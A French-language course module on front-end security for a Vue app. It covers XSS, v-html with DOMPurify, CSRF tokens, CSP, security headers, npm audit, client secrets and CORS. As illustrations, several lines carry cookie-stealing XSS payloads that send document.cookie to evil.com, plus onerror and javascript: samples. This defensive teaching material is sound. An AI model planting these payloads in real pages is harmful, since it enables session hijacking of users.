---
titre: Sécurité front
cours: 02-vue
notions: [XSS et échappement automatique Vue, dangers de v-html, CSRF et protection, Content Security Policy CSP, en-têtes de sécurité HTTP, dépendances et audit npm, secrets côté client, validation côté client vs serveur, CORS mécanisme et configuration serveur, eval et new Function dangers]
outcomes:
  - sait expliquer comment Vue protège du XSS et quand v-html est dangereux
  - sait se protéger du CSRF et poser une CSP
  - sait configurer les en-têtes de sécurité et auditer les dépendances
  - sait pourquoi la validation serveur reste indispensable
prerequis: [43-auth-authentification]
next: 45-rbac-et-permissions
libs: [{ name: vue, version: "3.5" }]
tribuzen: front-office TribuZen — sécuriser le front (échappement du contenu utilisateur des posts, CSP, pas de secret côté client)
last-reviewed: 2026-07
---

# Sécurité front

> **Outcomes — tu sauras FAIRE :** expliquer le mécanisme d'échappement automatique de Vue et les cas où `v-html` casse cette protection, poser un token CSRF et une Content Security Policy, auditer les dépendances npm, et justifier pourquoi la validation client ne remplace jamais celle du serveur.
> **Difficulté :** :star::star::star:

## 1. Cas concret d'abord

TribuZen permet aux familles de publier des posts dans leur espace commun. Le designer vient de demander d'afficher les posts avec **formatage HTML** (gras, italique, liens) — pas juste du texte brut. Un autre développeur propose :

```vue
<!-- PostContent.vue — première version -->
<template>
  <div v-html="post.content" />
</template>
```

Tu remarques que `post.content` vient directement de l'API, qui elle-même stocke ce que l'utilisateur a tapé dans un éditeur de texte riche. Trois questions s'imposent avant de merger ce PR :

1. Que se passe-t-il si un utilisateur malveillant a posté `<script>fetch('https://evil.com?c='+document.cookie)</script>` ?
2. L'API sanitize-t-elle côté serveur ? Est-ce suffisant si le front ne le fait pas aussi ?
3. Quelles autres surfaces d'attaque faut-il fermer sur ce front (CSRF, secrets, en-têtes) ?

Ce module répond à ces trois questions et te donne les outils pour sécuriser `PostContent.vue` et l'ensemble du front TribuZen.

---

## 2. Théorie complète, concise

### 2.1 XSS — Cross-Site Scripting

**Définition.** Le XSS est une injection de JavaScript malveillant dans une page web. Ce code s'exécute dans le navigateur de la victime avec tous ses privilèges : lecture de cookies, vol de tokens, envoi de requêtes en son nom, modification du DOM.

Trois variantes existent :
- **Stored XSS** — le payload est stocké en base (commentaire, post) et servi à chaque visiteur.
- **Reflected XSS** — le payload est dans l'URL, le serveur le renvoie dans la réponse HTML.
- **DOM-based XSS** — le payload est traité uniquement côté client, sans passer par le serveur.

**Mécanisme d'attaque Stored XSS (le plus dangereux) :**

```
Attaquant soumet : <script>fetch('https://evil.com?c='+document.cookie)</script>
Serveur stocke  : la chaîne brute en BDD
Front affiche   : le navigateur de la victime exécute le script
Résultat        : cookie de session volé → session hijacking
```

### 2.2 Échappement automatique de Vue

Vue échappe systématiquement le contenu interpolé avec <code v-pre>{{ }}</code>. L'échappement HTML remplace les caractères spéciaux par leurs entités HTML :

| Caractère | Entité HTML | Effet |
|-----------|-------------|-------|
| `<` | `&lt;` | Le navigateur affiche le signe, n'interprète pas de balise |
| `>` | `&gt;` | Idem |
| `"` | `&quot;` | Évite la rupture d'attribut |
| `&` | `&amp;` | Évite les entités parasites |

```vue
<script setup lang="ts">
const userInput = ref('<script>alert("xss")</script>')
</script>

<template>
  <!-- ✅ Vue échappe — le navigateur affiche la chaîne comme texte brut -->
  <p>{{ userInput }}</p>
  <!-- Rendu HTML : <p>&lt;script&gt;alert("xss")&lt;/script&gt;</p> -->
  <!-- Affiché à l'écran : <script>alert("xss")</script>  ← texte inoffensif -->
</template>
```

Cette protection est automatique et ne peut pas être désactivée accidentellement sur les interpolations <code v-pre>{{ }}</code>.

### 2.3 Danger de `v-html` — et sanitization avec DOMPurify

`v-html` injecte du HTML brut dans le DOM sans aucun échappement. C'est la seule directive Vue qui court-circuite la protection XSS.

```vue
<!-- ❌ FAILLE XSS : v-html sur contenu utilisateur non sanitizé -->
<div v-html="post.content" />
<!-- Si post.content = '<img src=x onerror="steal()">' → s'exécute ! -->
```

**Quand `v-html` est légitime :** affichage de HTML produit par un éditeur riche (Quill, TipTap, Tiptap), **à condition** que le contenu soit sanitizé avant affichage.

**Solution : DOMPurify.** DOMPurify analyse l'arbre DOM du HTML et retire tout ce qui peut exécuter du code (balises `<script>`, attributs d'événements `onerror`, `onclick`, `onload`, protocoles `javascript:` dans les `href`), tout en conservant le HTML de présentation (`<strong>`, `<em>`, `<a href="https://...">`, etc.).

```vue
<script setup lang="ts">
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps<{ content: string }>()

// ✅ Sanitization avant injection — DOMPurify.sanitize() est synchrone
const safeHtml = computed(() => DOMPurify.sanitize(props.content))
// Par défaut DOMPurify autorise les tags HTML sûrs et retire tout le reste.
// Pas d'option à passer pour l'usage standard — l'API de base est sûre par défaut.
</script>

<template>
  <!-- ✅ v-html sur contenu sanitizé uniquement -->
  <div v-html="safeHtml" />
</template>
```

**Installation :**
```bash
pnpm add dompurify
pnpm add -D @types/dompurify
```

**Piège URLs `javascript:`.** DOMPurify retire les `href="javascript:..."` par défaut. Si tu construis des URLs manuellement (sans DOMPurify), valide le protocole :

```ts
function isSafeUrl(url: string): boolean {
  try {
    const { protocol } = new URL(url)
    return protocol === 'http:' || protocol === 'https:'
  } catch {
    return false  // URL malformée → refuser
  }
}
```

### 2.4 CSRF — Cross-Site Request Forgery

**Mécanisme.** Le navigateur envoie automatiquement les cookies d'un domaine avec chaque requête vers ce domaine. Un site malveillant peut donc déclencher une requête vers ton API en se faisant passer pour l'utilisateur authentifié.

```
Utilisateur connecté à tribuzen.app (cookie de session valide)
Visite evil.com → un formulaire invisible envoie POST https://api.tribuzen.app/posts
Le navigateur joint automatiquement les cookies → l'API croit que c'est l'utilisateur
```

**Protection par token CSRF.** Le serveur génère un token aléatoire et l'envoie en cookie lisible par JavaScript (`HttpOnly: false`). À chaque mutation (POST/PUT/DELETE), le front lit ce token et le renvoie dans un header HTTP. Le site malveillant ne peut pas lire le cookie d'un autre domaine (Same-Origin Policy) → il ne peut pas fournir le header.

```ts
// composables/useCsrfFetch.ts
export function csrfFetch(url: string, options: RequestInit = {}): Promise<Response> {
  // Lecture du token depuis le cookie XSRF-TOKEN posé par le serveur
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('XSRF-TOKEN='))
    ?.split('=')[1] ?? ''

  return fetch(url, {
    ...options,
    credentials: 'include',          // Envoie les cookies de session
    headers: {
      'Content-Type': 'application/json',
      ...options.headers,
      'X-XSRF-TOKEN': csrfToken,     // Header vérifiable par le serveur
    },
  })
}
```

**Protection complémentaire : SameSite.** Le serveur peut poser le cookie de session avec `SameSite=Strict` (ou `Lax`) — le navigateur ne l'enverra pas depuis un autre site. C'est une protection côté serveur, mais le développeur front doit savoir que cette configuration est attendue.

```
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
```

`SameSite=Strict` : le cookie n'est jamais envoyé depuis un autre site.
`SameSite=Lax` : le cookie est envoyé pour les navigations GET top-level (liens) mais pas pour les requêtes cross-site POST/PUT/DELETE.

### 2.5 Content Security Policy (CSP)

La CSP est un header HTTP qui indique au navigateur quelles sources de code sont autorisées. Elle constitue une **défense en profondeur** contre le XSS : même si du code injecté arrive dans la page, le navigateur refuse de l'exécuter si sa source n'est pas autorisée.

**Header :**
```
Content-Security-Policy: <directive1>; <directive2>; ...
```

**Directives essentielles :**

| Directive | Rôle |
|-----------|------|
| `default-src` | Source de secours pour toutes les ressources non couvertes |
| `script-src` | Sources autorisées pour les scripts JavaScript |
| `style-src` | Sources autorisées pour les feuilles CSS |
| `img-src` | Sources autorisées pour les images |
| `connect-src` | URLs autorisées pour `fetch`, `XHR`, WebSocket |
| `font-src` | Sources autorisées pour les polices |
| `object-src` | Sources pour `<object>`, `<embed>` (mettre à `'none'`) |
| `frame-ancestors` | Qui peut encadrer la page dans un `<iframe>` |
| `base-uri` | URLs valides pour `<base href>` |

**Valeurs de sources :**

| Valeur | Signification |
|--------|---------------|
| `'self'` | Uniquement l'origine courante |
| `'none'` | Rien du tout (interdit) |
| `'nonce-<base64>'` | Script/style avec le nonce correspondant |
| `'strict-dynamic'` | Scripts chargés par un script de confiance (nonce) sont autorisés |
| `https:` | Tout HTTPS |
| `https://cdn.example.com` | Ce domaine spécifique |

**Exemple de politique TribuZen :**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-rAnDoM123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://storage.tribuzen.app;
  connect-src 'self' https://api.tribuzen.app;
  font-src 'self';
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  upgrade-insecure-requests
```

> `'unsafe-inline'` pour `script-src` annule la protection XSS — éviter absolument. `'nonce-xxx'` permet les scripts inline légitimes sans `unsafe-inline`.
> `upgrade-insecure-requests` force le navigateur à charger les ressources HTTP en HTTPS.

**Vite + CSP.** Vite en mode dev injecte des scripts inline pour le HMR. En production (build), utiliser un nonce côté serveur ou des hashes (`'sha256-...'`) pour les scripts inline générés.

### 2.6 En-têtes de sécurité HTTP

La CSP n'est pas le seul header de sécurité. Voici les indispensables :

| Header | Valeur recommandée | Rôle |
|--------|-------------------|------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS pour 1 an — HSTS |
| `X-Frame-Options` | `DENY` | Empêche le clickjacking (remplacé par `frame-ancestors 'none'` en CSP L2) |
| `X-Content-Type-Options` | `nosniff` | Empêche le navigateur de deviner le MIME type |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limite les infos envoyées dans `Referer` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Désactive les APIs navigateur non utilisées |

Ces headers sont configurés sur le serveur ou le CDN (Nginx, Cloudflare, Vercel headers). Le développeur front doit les connaître pour auditer et les demander à DevOps.

### 2.7 Dépendances et audit npm

Chaque dépendance installée est une surface d'attaque potentielle. Une bibliothèque vulnérable peut exposer des failles XSS, RCE ou exfiltration de données.

```bash
# Audit des dépendances avec pnpm
pnpm audit

# Sortie exemple :
# ┌─────────────────────────────────────────────────────────┐
# │                       === npm audit security report ===  │
# │ 2 vulnerabilities found                                  │
# │ Severity: 1 moderate / 1 high                           │
# └─────────────────────────────────────────────────────────┘

# Tentative de correction automatique (monte les versions)
pnpm audit --fix

# Audit de niveau minimum (échoue seulement sur high et critical)
pnpm audit --audit-level=high
```

**En CI :** ajouter `pnpm audit --audit-level=high` dans le pipeline — le build échoue si une vulnérabilité high ou critical est trouvée.

**Éviter les dépendances fantômes.** Installer uniquement ce dont on a besoin ; supprimer les dépendances inutilisées (`pnpm prune`). Chaque `node_modules` package ajouté peut introduire une vulnérabilité dans la chaîne d'approvisionnement (supply-chain attack).

### 2.8 Secrets côté client — règle absolue

Vite remplace les références `import.meta.env.VITE_*` par leurs valeurs **au moment du build**. Ces valeurs sont donc en clair dans le bundle JavaScript téléchargé par tous les navigateurs.

```ts
// ❌ JAMAIS — la clé Stripe secrète sera dans bundle.js en clair
const stripeSecret = import.meta.env.VITE_STRIPE_SECRET_KEY

// ✅ Clé publique (conçue pour être exposée côté client) — OK
const stripePublicKey = import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY

// ✅ Clé secrète → côté serveur uniquement, jamais préfixée VITE_
// Dans une Nuxt server route ou un endpoint NestJS
// process.env.STRIPE_SECRET_KEY
```

```bash
# .env
VITE_API_BASE=https://api.tribuzen.app   # ✅ URL publique
VITE_STRIPE_PK=pk_live_xxx               # ✅ Clé publique Stripe
STRIPE_SECRET=sk_live_xxx                # ✅ Secret — sans VITE_, inaccessible au front
DATABASE_URL=postgres://...              # ✅ Sans VITE_ — ne jamais lui mettre ce préfixe
```

**Avec Nuxt**, la séparation est explicitée dans `runtimeConfig` :
```ts
// nuxt.config.ts
export default defineNuxtConfig({
  runtimeConfig: {
    stripeSecret: '',         // Côté serveur uniquement
    public: {
      apiBase: '',            // Accessible côté client
    },
  },
})
```

### 2.9 Validation côté client vs côté serveur

La validation côté client améliore l'expérience utilisateur (feedback immédiat) mais ne constitue **aucune** barrière de sécurité : le code JS est exécuté dans le navigateur de l'utilisateur, qu'il contrôle entièrement.

```
Validation client : bypass trivial avec DevTools → modifier la variable JS / intercepter la requête avec Burp Suite
Validation serveur : seule garantie — le serveur contrôle ses propres règles
```

**Principe : toujours les deux, jamais l'un sans l'autre.**

```ts
// composables/useRegisterForm.ts — validation CÔTÉ CLIENT (UX)
import { z } from 'zod'

const passwordSchema = z
  .string()
  .min(8, '8 caractères minimum')
  .regex(/[A-Z]/, '1 majuscule requise')
  .regex(/[0-9]/, '1 chiffre requis')

export function useRegisterForm() {
  const password = ref('')
  const error = ref<string | null>(null)

  function validateLocally(): boolean {
    const result = passwordSchema.safeParse(password.value)
    error.value = result.success ? null : result.error.issues[0].message
    return result.success
  }

  // La fonction submit appelle validateLocally() PUIS envoie au serveur
  // Le serveur réapplique les mêmes règles — le double contrôle est intentionnel
  return { password, error, validateLocally }
}
```

Le serveur doit reproduire les mêmes règles (souvent avec le même schéma Zod partagé via un package monorepo `@tribuzen/schemas`).

### 2.10 CORS — Cross-Origin Resource Sharing

**Mécanisme.** CORS est une politique de sécurité **enforced par le navigateur** : quand une page chargée depuis `http://localhost:5173` tente un `fetch` vers `http://localhost:3000`, le navigateur bloque la réponse par défaut si le serveur ne déclare pas explicitement que cette origine est autorisée.

> CORS protège **l'utilisateur** (empêche un site malveillant de lire des données d'une autre origine en se servant du navigateur comme proxy). CORS **ne protège pas le serveur** — un attaquant avec `curl` contourne CORS car il n'est pas un navigateur.

**Message d'erreur dev local classique (Vite 5173 → API 3000) :**

```
Access to fetch at 'http://localhost:3000/api/users'
from origin 'http://localhost:5173' has been blocked by CORS policy:
No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

Ce message apparaît dans la console DevTools → onglet Console ou Network. La requête est visible dans l'onglet Network avec un statut CORS error — le serveur a bien reçu la requête (côté serveur le log apparaît), mais le navigateur bloque la réponse.

**Pourquoi ça arrive :** Vite dev server (`5173`) et l'API (`3000`) ont des origines différentes. La Same-Origin Policy du navigateur bloque les réponses cross-origin sans header explicite.

**Solution côté serveur :** configurer les headers CORS sur l'API. La correction se fait toujours côté serveur, jamais côté front (le front ne peut pas s'octroyer des permissions qu'il n'a pas).

```ts
// NestJS — @nestjs/platform-express
// main.ts
async function bootstrap() {
  const app = await NestFactory.create(AppModule)

  app.enableCors({
    origin: ['http://localhost:5173', 'https://app.tribuzen.com'],
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    credentials: true,   // Autorise l'envoi de cookies (requis pour CSRF cookie)
  })

  await app.listen(3000)
}
```

```ts
// Express — cors middleware
import cors from 'cors'

app.use(cors({
  origin: (origin, callback) => {
    const allowed = ['http://localhost:5173', 'https://app.tribuzen.com']
    if (!origin || allowed.includes(origin)) callback(null, true)
    else callback(new Error('CORS non autorisé'))
  },
  credentials: true,
}))
```

**Headers CORS essentiels :**

| Header (réponse serveur) | Rôle |
|--------------------------|------|
| `Access-Control-Allow-Origin` | Origines autorisées (`*` ou URL précise) |
| `Access-Control-Allow-Methods` | Méthodes HTTP autorisées |
| `Access-Control-Allow-Headers` | Headers que le client peut envoyer (ex: `Content-Type`, `X-XSRF-TOKEN`) |
| `Access-Control-Allow-Credentials` | `true` si cookies/credentials doivent être envoyés |

**Preflight (requête OPTIONS) :** pour les requêtes "non simples" (POST avec `Content-Type: application/json`, ou avec headers custom), le navigateur envoie d'abord une requête OPTIONS. Le serveur doit répondre avec les headers CORS avant que la vraie requête parte. NestJS et Express-cors gèrent cela automatiquement.

**Contournement dev sans modifier le serveur :** configurer le proxy Vite :

```ts
// vite.config.ts — proxy : Vite fait les requêtes en son nom (même origine côté navigateur)
export default defineConfig({
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        changeOrigin: true,
      },
    },
  },
})
```

Avec ce proxy, le front appelle `/api/users` (même origine `5173`) — Vite redirige vers `3000` sans CORS. **Ce contournement n'existe qu'en dev** — en production, l'API doit exposer les bons headers CORS.

---

## 3. Worked examples

### Exemple 1 — `PostContent.vue` avec `v-html` sanitizé (TribuZen)

Cas complet : un post TribuZen peut contenir du HTML formaté produit par l'éditeur Tiptap. On doit l'afficher avec `v-html` tout en neutralisant les payloads XSS.

```vue
<!-- PostContent.vue -->
<script setup lang="ts">
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps<{
  content: string       // HTML brut venant de l'API
  authorName: string    // Texte brut — interpolation {{ }} suffit
}>()

// DOMPurify.sanitize() retire scripts, événements inline, javascript: href
// mais conserve <strong>, <em>, <ul>, <li>, <a href="https://...">
const safeContent = computed(() => DOMPurify.sanitize(props.content))

// Nom de l'auteur : texte brut → interpolation {{ }} dans le template,
// jamais v-html même si on voulait afficher le nom en gras (pas nécessaire)
</script>

<template>
  <article class="post">
    <!-- ✅ Texte brut : {{ }} — Vue échappe automatiquement -->
    <header class="post__author">{{ props.authorName }}</header>

    <!-- ✅ HTML formaté : v-html sur contenu sanitizé uniquement -->
    <!-- safeContent ne peut plus contenir de XSS — DOMPurify l'a retiré -->
    <div class="post__body" v-html="safeContent" />
  </article>
</template>
```

**Vérification manuelle rapide :**
```ts
// Dans la console navigateur ou un test unitaire
import DOMPurify from 'dompurify'

DOMPurify.sanitize('<p>Bonjour <strong>Alice</strong></p>')
// → '<p>Bonjour <strong>Alice</strong></p>'  ✅ HTML sûr conservé

DOMPurify.sanitize('<img src=x onerror="steal()">')
// → '<img src="x">'  ✅ onerror retiré

DOMPurify.sanitize('<a href="javascript:steal()">cliquez</a>')
// → '<a>cliquez</a>'  ✅ href javascript: retiré

DOMPurify.sanitize('<script>alert(1)</script>')
// → ''  ✅ balise script entièrement supprimée
```

### Exemple 2 — CSP posée via Nitro/Nuxt (méta-header)

Dans un projet Nuxt 3, la CSP se pose dans `nuxt.config.ts` via les `routeRules` ou les headers Nitro :

```ts
// nuxt.config.ts
export default defineNuxtConfig({
  nitro: {
    routeRules: {
      '/**': {
        headers: {
          // CSP — valeur unique sur une ligne (pas de retour à la ligne dans le header)
          'Content-Security-Policy':
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://storage.tribuzen.app; connect-src 'self' https://api.tribuzen.app; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; upgrade-insecure-requests",
          'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
          'X-Content-Type-Options': 'nosniff',
          'Referrer-Policy': 'strict-origin-when-cross-origin',
          'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
        },
      },
    },
  },
})
```

**Tester la CSP :** ouvrir DevTools → onglet Console. Toute violation CSP génère un message `Refused to execute inline script because it violates the following Content Security Policy directive...`. L'onglet Network → colonne `Content-Security-Policy` dans les headers de réponse confirme que le header est bien envoyé.

---

## 4. Pièges & misconceptions

### PIÈGE #1 — `v-html` sur contenu utilisateur non sanitizé

```vue
<!-- ❌ FAILLE — même si l'API "semble" sûre -->
<div v-html="post.content" />

<!-- ✅ TOUJOURS passer par DOMPurify -->
<div v-html="safeContent" />
<!-- avec : const safeContent = computed(() => DOMPurify.sanitize(post.content)) -->
```

**Pourquoi c'est faux de faire confiance à l'API :** le front ne contrôle pas le serveur. Une faille dans l'API, une injection SQL permettant d'écrire directement en BDD, ou un admin malveillant peuvent faire passer un payload XSS même si la validation serveur existe. La défense en profondeur exige une sanitization côté client ET côté serveur.

### PIÈGE #2 — Mettre un secret dans une variable `VITE_*`

```bash
# ❌ DANGER — dans bundle.js en clair
VITE_STRIPE_SECRET=sk_live_xxx

# ✅ Sans préfixe VITE_ → inaccessible côté front
STRIPE_SECRET=sk_live_xxx
```

**Pourquoi c'est souvent un accident :** le développeur copie-colle une clé dans `.env` en ajoutant machinalement `VITE_` pour la rendre "accessible". Mais `VITE_` = public. Vérifier systématiquement : si c'est un secret (commence par `sk_`, `secret`, `token`, `password`), aucun `VITE_` ne doit le préfixer.

### PIÈGE #3 — Se fier à la validation côté client pour la sécurité

```ts
// ❌ ERREUR DE RAISONNEMENT
// Le serveur ne valide pas parce que "le front valide déjà"
async function submitPost(content: string) {
  if (content.length < 10) return  // client valide → pas d'envoi
  await api.post('/posts', { content })  // le serveur accepte sans valider
}

// ✅ Correct — les deux couches valident indépendamment
// Client : for UX feedback
// Serveur : for security enforcement
```

Un attaquant peut envoyer la requête directement avec `curl` ou Burp Suite, contournant entièrement le front.

### PIÈGE #4 — `eval()` et `new Function()` — équivalents à `v-html` non sanitizé

```ts
// ❌ eval() exécute du code arbitraire dans le contexte de la page
const userExpression = "fetch('https://evil.com?c='+document.cookie)"
eval(userExpression)   // → vole les cookies si la chaîne vient de l'utilisateur

// ❌ new Function() — idem, avec l'apparence d'un constructeur "sûr"
const fn = new Function('return ' + userInput)
fn()  // → exécute userInput comme JavaScript
```

Ces deux constructions sont l'équivalent exact d'un `v-html` non sanitizé : elles interprètent une chaîne comme du code exécutable. Le risque XSS est **identique** — si `userInput` vient de l'API ou d'un formulaire, n'importe quel payload JavaScript s'exécute avec les privilèges de la page.

**Correct :** ne jamais passer de données utilisateur à `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`. Utiliser des alternatives sûres :

```ts
// ✅ Calculer une expression arithmétique simple sans eval
import { evaluate } from 'mathjs'   // lib dédiée et sandboxée
const result = evaluate('2 + 3 * 4')   // → 14, sans exec de code arbitraire

// ✅ Exécuter une action selon un choix utilisateur → switch/map, pas eval
const ACTIONS: Record<string, () => void> = {
  save: () => save(),
  cancel: () => cancel(),
}
const action = ACTIONS[userChoice]
if (action) action()   // map typé, jamais eval
```

La CSP avec `script-src 'self'` bloque les scripts inline (`eval` contourne les CSP sans `'unsafe-eval'`) — ne jamais ajouter `'unsafe-eval'` à la CSP.

### PIÈGE #5 — `'unsafe-inline'` dans `script-src` annule la CSP

```
# ❌ Inutile — 'unsafe-inline' dans script-src autorise tous les scripts inline
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# ✅ Utiliser des nonces pour les scripts inline légitimes
Content-Security-Policy: script-src 'self' 'nonce-abc123'
# <script nonce="abc123">/* script légitime */</script>
```

Beaucoup de développeurs ajoutent `'unsafe-inline'` pour "faire marcher Vite en dev" sans savoir que cela détruit la protection XSS de la CSP.

---

## 5. Ancrage TribuZen

Trois couches dans TribuZen sont directement concernées par ce module :

**`PostContent.vue` (feed famille)** — les posts contiennent du HTML riche (Tiptap). Sans DOMPurify, un membre peut injecter du XSS lisible par toute la famille. Avec `safeContent = computed(() => DOMPurify.sanitize(content))` sur la prop, la protection est garantie côté front même si le serveur a une faille.

**`api/client.ts` (couche fetch)** — tous les appels mutatifs (POST/PUT/DELETE) passent par `csrfFetch` qui lit le cookie `XSRF-TOKEN` et le renvoie dans le header `X-XSRF-TOKEN`. Le serveur NestJS valide ce header sur les routes protégées.

**`nuxt.config.ts` (infrastructure front)** — les en-têtes CSP, HSTS, `nosniff`, `Referrer-Policy` sont posés via `routeRules` Nitro. Un job CI (`pnpm audit --audit-level=high`) bloque le déploiement si une dépendance critique est vulnérable.

```
tribuzen/
  src/
    components/
      post/
        PostContent.vue          ← DOMPurify sur v-html
    api/
      client.ts                  ← csrfFetch (X-XSRF-TOKEN)
  nuxt.config.ts                 ← CSP + headers de sécurité
  .github/workflows/ci.yml       ← pnpm audit dans CI
```

---

## 6. Points clés

1. Vue échappe automatiquement <code v-pre>{{ }}</code> — le XSS via interpolation est impossible par défaut.
2. `v-html` contourne cette protection — n'utiliser que sur du HTML sanitizé par DOMPurify.
3. `DOMPurify.sanitize(html)` retire scripts, événements inline et protocoles `javascript:` en conservant le HTML de présentation.
4. Le CSRF exploite les cookies envoyés automatiquement par le navigateur — le token CSRF dans un header bloque l'attaque car un site tiers ne peut pas lire les cookies cross-origin.
5. `SameSite=Strict` sur le cookie de session est une protection CSRF complémentaire, configurée côté serveur.
6. La CSP est un header HTTP déclarant les sources autorisées — elle bloque l'exécution de code injecté même si le XSS atteint le DOM.
7. `'unsafe-inline'` dans `script-src` annule la protection XSS de la CSP — utiliser des nonces à la place.
8. Les variables `VITE_*` sont publiques (dans le bundle) — les secrets ne portent jamais ce préfixe.
9. `pnpm audit` détecte les vulnérabilités dans les dépendances — à intégrer en CI avec `--audit-level=high`.
10. La validation client = UX. La validation serveur = sécurité. Les deux sont toujours présents, jamais l'un sans l'autre.

---

## 7. Seeds Anki

```
Pourquoi {{ userInput }} est-il sûr contre le XSS en Vue ?|Vue échappe automatiquement les caractères spéciaux HTML (< → &lt; > → &gt; etc.) dans toute interpolation {{ }}. Le contenu est rendu comme texte, jamais comme code.
Quelle directive Vue contourne la protection XSS automatique ?|v-html — elle injecte du HTML brut sans échappement. N'utiliser que sur du contenu sanitizé par DOMPurify.
Quelle est la signature d'appel minimale de DOMPurify pour sanitizer un post HTML ?|DOMPurify.sanitize(htmlString) — synchrone, retire scripts/événements inline/javascript: href tout en conservant le HTML de présentation.
Comment un token CSRF protège-t-il contre une requête forgée depuis un site tiers ?|Le serveur pose un token en cookie lisible JS (XSRF-TOKEN). Le front le lit et l'envoie dans un header (X-XSRF-TOKEN). Le site malveillant ne peut pas lire le cookie cross-origin → ne peut pas fournir le header → requête rejetée par le serveur.
Quelle directive CSP bloque les scripts inline sans 'unsafe-inline' ?|script-src avec une valeur de nonce : script-src 'self' 'nonce-abc123'. Seuls les scripts portant l'attribut nonce="abc123" sont exécutés.
Pourquoi une variable VITE_API_SECRET est-elle une faille de sécurité ?|Vite remplace import.meta.env.VITE_* par leurs valeurs au build — la valeur se retrouve en clair dans bundle.js téléchargé par tous les navigateurs. Les secrets ne doivent jamais avoir le préfixe VITE_.
Quelle commande pnpm détecte les failles dans les dépendances et peut bloquer la CI ?|pnpm audit --audit-level=high — retourne un code d'erreur non-zéro si une vulnérabilité high ou critical est trouvée.
Pourquoi la validation côté client ne remplace-t-elle pas la validation serveur ?|Le code JS s'exécute dans le navigateur de l'utilisateur qu'il contrôle. Il peut modifier les variables, désactiver le JS, ou envoyer la requête directement via curl/Burp Suite en contournant tout le front.
Qu'est-ce que CORS et qui est chargé de le configurer ?|CORS (Cross-Origin Resource Sharing) est une politique enforced par le navigateur qui bloque les réponses cross-origin sans header explicite. Il se configure côté SERVEUR (Access-Control-Allow-Origin etc.) — le front ne peut pas s'octroyer des permissions qu'il n'a pas.
Pourquoi eval() et new Function() sont-ils aussi dangereux que v-html non sanitizé ?|Ils interprètent une chaîne comme du code JavaScript exécutable dans le contexte de la page. Si la chaîne contient du contenu utilisateur, n'importe quel payload s'exécute avec les privilèges de la page — identique au risque XSS de v-html.
```

---

## Pont vers le lab

> Lab associé : `02-vue/labs/lab-44-securite-front/README.md`. Sécuriser `PostContent.vue` avec DOMPurify, poser les en-têtes de sécurité via Nuxt routeRules, et auditer les dépendances — vrai outil, corrigé complet.
